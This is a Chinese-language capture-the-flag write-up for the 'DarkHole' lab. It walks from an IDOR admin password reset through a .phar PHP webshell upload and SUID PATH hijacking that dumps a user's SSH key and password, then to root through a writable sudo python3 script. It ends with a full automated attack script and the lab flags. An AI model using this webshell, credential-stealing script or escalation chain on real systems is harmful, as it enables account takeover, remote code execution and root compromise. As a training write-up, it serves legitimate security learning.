---
title: 'DarkHole — IDOR + SUID PATH Hijack + Sudo 多层提权'
date: '2026-05-28'
modifiedTime: '2026-05-28'
intro: 'IDOR 重置 admin 密码 → 文件上传绕过（.phar webshell）→ SUID PATH 劫持 → john 私钥泄露 → sudo python3 提权。从 Web 应用到 root，贯穿 IDOR、文件上传、SUID 劫'
tags: ['ctf', 'writeup', '文件上传', '提权', 'idor', 'php', 'python', '命令注入']
cover: ''
---

# DarkHole — IDOR + SUID PATH Hijack + Sudo 多层提权

## Summary

IDOR 重置 admin 密码 → 文件上传绕过（.phar webshell）→ SUID PATH 劫持 → john 私钥泄露 → sudo python3 提权。从 Web 应用到 root，贯穿 IDOR、文件上传、SUID 劫持、sudo 滥用四条攻击链。

## 侦查

两个目标端口：

| 地址 | 端口 | 服务 |
|------|------|------|
| `kmqrtx2` / `37a9822` | 41119 | Apache 2.4.41 + DarkHole |
| `kmqrtx2` | 49354 | OpenSSH 8.2p1 (Ubuntu) |

Web 首页有 Login / Register 入口，注册后进入 Dashboard。

## Solution

### Step 1: IDOR 密码重置 → Admin

注册用户后，Dashboard 的密码修改表单有隐藏的 `id` 字段。修改 `id` 值即可重置任意用户密码：

```python
# 注册用户 agent48 (id=4)
session.post('/register.php', data={'username': 'agent48', 'password': 'agent48', 'email': 'a@a.com'})

# 登录后，通过 POST 修改 id=1 (admin) 的密码
session.post('/dashboard.php?id=4', data={'password': 'pwned456', 'id': '1'})

# 以 admin 登录
session.post('/login.php', data={'username': 'admin', 'password': 'pwned456'})
```

Admin 面板比普通用户多了一个 **Upload** 功能。

### Step 2: 扩展名绕过上传 Webshell

上传 `.php` 文件被过滤（404），但 `.phar` 可上传且 Apache 解析为 PHP：

```python
shell = '<?php echo "PWNED"; system($_GET["c"]); ?>'

# .php → 被拦截, .phar → 成功执行
session.post('/dashboard.php?id=1', files={
    'fileToUpload': ('shell.phar', shell, 'application/octet-stream')
})
```

目录列表 `/upload/` 开放，可直接访问 webshell。

### Step 3: Flag 1 — /tmp/flag.txt

```bash
curl "http://target:41119/upload/shell.phar?c=cat%20/tmp/flag.txt"
```

```
flag{2d35dde8-6158-4a2a-ade0-3b9e5c21bfe5}
```

### Step 4: SUID PATH 劫持 → John

`/home/john/` 目录 777 权限，内含 SUID 二进制 `toto`：

```bash
$ strings /home/john/toto | grep system
system
```

`toto` 调用 `system("id")` 无绝对路径。PATH 劫持：

```bash
# 创建恶意 id 脚本
printf '%s\n' '#!/bin/bash' 'cat /home/john/.ssh/id_rsa' 'cat /home/john/password' > /tmp/id
chmod +x /tmp/id

# PATH 劫持执行
PATH=/tmp:$PATH /home/john/toto
```

获取到 john 的 SSH 私钥和密码 `root123`。

### Step 5: Sudo 提权 → Root

SSH 登录 john 后检查 sudo：

```
User john may run the following commands:
    (root) /usr/bin/python3 /home/john/file.py
```

`file.py` 为空且 john 可写。写入恶意代码后 sudo 执行：

```bash
echo 'import os; print(open("/root/flag.txt").read())' > /home/john/file.py
echo root123 | sudo -S /usr/bin/python3 /home/john/file.py
```

### Flag 2 — /root/flag.txt

```
flag{6cd34a11-8202-4677-9551-f09a2ac8260e}
```

## 完整攻击脚本

```python
import requests

BASE = 'http://TARGET:41119'
SSH_HOST = 'TARGET_SSH'
SSH_PORT = 49354

session = requests.session()

# 1. 注册 + 登录
session.post(f'{BASE}/register.php', data={
    'username': 'attacker', 'email': 'att@cker.com', 'password': 'attacker'
})
session.post(f'{BASE}/login.php', data={'username': 'attacker', 'password': 'attacker'})

# 2. IDOR 重置 admin 密码
session.post(f'{BASE}/dashboard.php?id=4', data={'password': 'pwned', 'id': '1'})

# 3. 登录 admin
session2 = requests.session()
session2.post(f'{BASE}/login.php', data={'username': 'admin', 'password': 'pwned'})

# 4. 上传 .phar webshell
session2.post(f'{BASE}/dashboard.php?id=1', files={
    'fileToUpload': ('s.phar', '<?php system($_GET["c"]); ?>', 'application/octet-stream')
})

# 5. Flag 1
ws = f'{BASE}/upload/s.phar'
print('Flag 1:', requests.get(ws, params={'c': 'cat /tmp/flag.txt'}).text.strip())

# 6. PATH 劫持 toto → 获取 john 凭据
script = '#!/bin/bash\ncat /home/john/.ssh/id_rsa\ncat /home/john/password\n'
requests.get(ws, params={'c': f'printf "%s\\n" "#!/bin/bash" "cat /home/john/.ssh/id_rsa" "cat /home/john/password" > /tmp/id && chmod +x /tmp/id'})
requests.get(ws, params={'c': 'PATH=/tmp:$PATH /home/john/toto'})

# 7. SSH john + sudo 提权 → Flag 2
# (需手动完成最后一步 SSH)
# sshpass -p 'root123' ssh john@SSH_HOST -p SSH_PORT \
#   'echo "import os; print(open(\"/root/flag.txt\").read())" > /home/john/file.py && echo root123 | sudo -S python3 /home/john/file.py'
```

## Flag

```
Flag 1: flag{2d35dde8-6158-4a2a-ade0-3b9e5c21bfe5}
Flag 2: flag{6cd34a11-8202-4677-9551-f09a2ac8260e}
```

## 关键技术点

- **IDOR**: 密码修改表单的 `id` 参数未校验归属，可重置任意用户密码
- **扩展名绕过**: `.php` 被拦截，`.phar` 既可上传又可执行
- **SUID PATH 劫持**: `system("id")` 未使用绝对路径，`$PATH` 可控
- **sudo 配置缺陷**: `file.py` 用户可写 + sudo 允许 root 执行，等于任意代码以 root 运行
- **目录权限过宽**: `/home/john/` 777，`.ssh/` 对 www-data 组可读
